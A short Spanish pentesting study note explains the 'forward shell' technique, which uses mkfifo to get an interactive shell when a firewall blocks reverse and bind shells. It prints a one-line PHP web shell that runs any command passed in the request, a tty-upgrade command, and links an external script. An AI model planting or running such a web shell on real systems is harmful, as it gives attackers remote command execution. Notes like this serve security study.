------------
- Tags: #bash #shells #exploiting #hacking 
--------------------
# Definición

> Puede darse el caso de que la máquina comprometida haga uso de un firewall, bloqueando el tráfico saliente, de manera que no se pueda establecer conexión ni con una [[Reverse shell]] ni con una [[Bind shell]]. 

---------------
# Uso

> Se consigue a través del uso de **mkfifo**, creando un archivo **FIFO** que se utiliza como consola simulada interactiva a través de la cual el atacante puede operar en la máquina comprometida. En vez de ser una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, permitiendo la comunicación con la máquina comprometida.

Para hacer uso de esta [[Shell]], utilizaremos un script de **s4vitar**[^1] para obtener una **tty** interactiva. Para ello es necesario subir a la máquina comprometida el siguiente archivo en php:

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

Posteriormente hay que retocar un poco el script, y ejecutándolo, una especie de [[Reverse shell]], aunque haría falta el uso del siguiente comando para conseguir realmente una **tty**:

```bash
script /dev/null -c bash
```


------------
# Referencias

[^1]: Para descargar dicho script : [repositorio TTYOverHTTP](https://github.com/s4vitar/ttyoverhttp)